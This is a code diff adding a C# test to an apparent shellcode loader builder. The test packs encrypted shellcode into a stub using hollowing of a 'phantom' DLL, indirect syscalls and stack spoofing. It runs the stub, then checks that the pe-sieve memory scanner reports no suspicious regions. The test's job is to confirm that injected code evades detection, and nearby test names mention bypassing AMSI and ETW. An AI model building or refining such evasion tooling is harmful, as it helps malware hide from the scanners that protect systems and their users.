@@ -519,6 +519,144 @@ RunDotNetTest("DotNetLoad + AES + PatchlessAmsiEtw",
     CipherType.AES256);
 
 // ═══════════════════════════════════════════════════════════
+//  PE-sieve Image Classification Test (M2)
+//  Verifies that Phantom DLL hollowed regions appear as
+//  Image-backed (not Private/unbacked) to pe-sieve.
+//  pe-sieve64.exe must be present in build/out/ directory.
+// ═══════════════════════════════════════════════════════════
+Console.WriteLine("\n── PE-sieve Image Classification Test ──\n");
+
+{
+    string peSievePath = Path.Combine(outDir, "pe-sieve64.exe");
+    if (!File.Exists(peSievePath))
+    {
+        Console.WriteLine("  SKIP (pe-sieve64.exe not found in build/out/)");
+        skipped++;
+    }
+    else if (rawShellcode == null)
+    {
+        Console.WriteLine("  SKIP (no sc_test.bin for PhantomDLL test)");
+        skipped++;
+    }
+    else if (!isAdmin)
+    {
+        Console.WriteLine("  SKIP (needs admin for pe-sieve process inspection)");
+        skipped++;
+    }
+    else
+    {
+        totalTests++;
+        Console.Write($"  [{totalTests}] {\"PhantomDLL + pe-sieve Image-backed\",-45} ");
+
+        string outputPath = Path.Combine(outDir, $"e2e_test_{totalTests}.exe");
+        byte[] key = RandomNumberGenerator.GetBytes(32);
+        byte[] encrypted = CryptoEngine.Encrypt(rawShellcode, key, CipherType.XOR);
+
+        var config = new BuildConfig { PhantomDLL = true, EncAlgorithm = 3, IndirectSyscalls = true, StackSpoof = true };
+        string error = StubPatcher.Build((byte[])stubTemplate.Clone(), outputPath, encrypted, key, config);
+        if (!string.IsNullOrEmpty(error)) { Console.WriteLine($"BUILD FAIL: {error}"); failed++; goto pesieve_done; }
+
+        if (File.Exists(scMarkerPath)) File.Delete(scMarkerPath);
+        Thread.Sleep(200);
+
+        var proc = Process.Start(new ProcessStartInfo(outputPath) { UseShellExecute = false });
+        if (proc == null) { Console.WriteLine("LAUNCH FAIL"); failed++; goto pesieve_done; }
+
+        // Wait for payload to execute and establish Phantom DLL
+        bool payloadExecuted = false;
+        for (int i = 0; i < 10; i++)
+        {
+            Thread.Sleep(2000);
+            if (File.Exists(scMarkerPath))
+            {
+                payloadExecuted = true;
+                break;
+            }
+        }
+
+        if (!payloadExecuted)
+        {
+            Console.WriteLine("FAIL (payload didn't execute for pe-sieve scan)");
+            try { proc.Kill(); } catch {}
+            failed++;
+            goto pesieve_done;
+        }
+
+        // Run pe-sieve against the process
+        string sieveDir = Path.Combine(outDir, "pesieve_out");
+        if (Directory.Exists(sieveDir)) Directory.Delete(sieveDir, true);
+        Directory.CreateDirectory(sieveDir);
+
+        var sieveProc = Process.Start(new ProcessStartInfo
+        {
+            FileName = peSievePath,
+            Arguments = $"/pid {proc.Id} /quiet /dir \"{sieveDir}\"",
+            UseShellExecute = false,
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            CreateNoWindow = true
+        });
+
+        if (sieveProc == null)
+        {
+            Console.WriteLine("FAIL (pe-sieve launch failed)");
+            try { proc.Kill(); } catch {}
+            failed++;
+            goto pesieve_done;
+        }
+
+        string sieveOutput = sieveProc.StandardOutput.ReadToEnd();
+        sieveProc.WaitForExit(30000);
+
+        // Parse pe-sieve output for suspicious vs image-backed regions
+        // pe-sieve exit code: 0 = no suspicious, 1 = suspicious found
+        // We want NO suspicious regions for Phantom DLL areas (they should appear as Image-backed)
+        bool hasSuspicious = sieveProc.ExitCode == 1;
+
+        // Also check the reports directory for .tag files
+        var tagFiles = Directory.GetFiles(sieveDir, "*.tag", SearchOption.AllDirectories);
+        var suspiciousTags = tagFiles.Where(f =>
+        {
+            string content = File.ReadAllText(f);
+            return content.Contains("suspicious") || content.Contains("patched") || content.Contains("unbacked");
+        }).ToList();
+
+        // Check for Image-backed indicators in pe-sieve output
+        bool hasImageBacked = sieveOutput.Contains("Image") || tagFiles.Any(f =>
+        {
+            string content = File.ReadAllText(f);
+            return content.Contains("Image") && !content.Contains("suspicious");
+        });
+
+        // Phantom DLL regions should NOT be flagged as suspicious
+        // If pe-sieve finds no suspicious regions → PASS (Phantom DLL looks legitimate)
+        // If pe-sieve finds suspicious but also Image-backed → partial pass
+        if (!hasSuspicious)
+        {
+            Console.WriteLine("PASS (pe-sieve: no suspicious regions)");
+            passed++;
+        }
+        else if (hasImageBacked && suspiciousTags.Count == 0)
+        {
+            Console.WriteLine("PASS (pe-sieve: regions Image-backed, no unbacked)");
+            passed++;
+        }
+        else
+        {
+            Console.WriteLine($"FAIL (pe-sieve found {suspiciousTags.Count} suspicious regions)");
+            failed++;
+        }
+
+        try { proc.Kill(); } catch {}
+        if (File.Exists(scMarkerPath)) File.Delete(scMarkerPath);
+        try { if (File.Exists(outputPath)) File.Delete(outputPath); } catch {}
+        try { if (Directory.Exists(sieveDir)) Directory.Delete(sieveDir, true); } catch {}
+    }
+
+    pesieve_done:;
+}
+
+// ═══════════════════════════════════════════════════════════
 //  Summary
 // ═══════════════════════════════════════════════════════════
 Console.WriteLine($"\n{'═',-60}");
